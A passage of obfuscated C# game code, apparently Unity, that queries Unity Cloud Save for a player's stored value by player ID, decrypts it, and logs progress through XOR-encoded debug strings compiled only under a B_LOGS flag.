            int _0x723979a5 = 0;
            do
            {
                _0xb407cd54 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x1d049fc9._0x8f92ce0a(new byte[8] { 18, 14, 3, 27, 7, 16, 43, 6 }, 98), _0x1e834b18, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x1e834b18 }), new QueryOptions())).ToList();
                await Task.Delay(_0xe4e07533);
            }
            while (_0xb407cd54.Count == 0 && _0x723979a5++ < _0xa3d9a80f);
            {
#if B_LOGS
                {
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[33] { 19, 28, 45, 59, 60, 21, 104, 27, 41, 62, 45, 44, 104, 4, 33, 38, 35, 104, 25, 61, 45, 58, 49, 104, 58, 45, 59, 61, 36, 60, 59, 114, 104 }, 72) + JsonConvert.SerializeObject(_0xb407cd54, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[39] { 24, 23, 38, 48, 55, 30, 99, 16, 34, 53, 38, 39, 99, 15, 42, 45, 40, 99, 18, 54, 38, 49, 58, 99, 49, 38, 48, 54, 47, 55, 48, 99, 32, 44, 54, 45, 55, 121, 99 }, 67) + _0xb407cd54.Count);
                }
#endif
            }

            var _0xcd3026b1 = _0xb407cd54.SelectMany(_0x700df315 => _0x700df315.Data).FirstOrDefault(_0x3b83c3f5 => _0x3b83c3f5.Key == _0x1e834b18)?.Value.GetAs<string>() ?? string.Empty;
            _0xcd3026b1 = Decrypt(_0xcd3026b1, _0x1e834b18);
            {
#if B_LOGS
                {
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[24] { 201, 198, 247, 225, 230, 207, 178, 222, 253, 243, 246, 178, 225, 243, 228, 247, 246, 178, 254, 251, 252, 249, 168, 178 }, 146) + _0xcd3026b1);
                }
#endif
            }

            return _0xcd3026b1;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[39] { 6, 9, 56, 46, 41, 0, 125, 26, 56, 41, 125, 50, 47, 125, 45, 60, 47, 46, 56, 125, 46, 60, 43, 56, 57, 125, 49, 52, 51, 54, 125, 59, 60, 52, 49, 56, 57, 103, 125 }, 93) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    // MAIN FLOW
    private bool _0xc1c72a84 { get; set; }
}

internal static class _0x1d049fc9
{
    internal static string _0x8f92ce0a(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}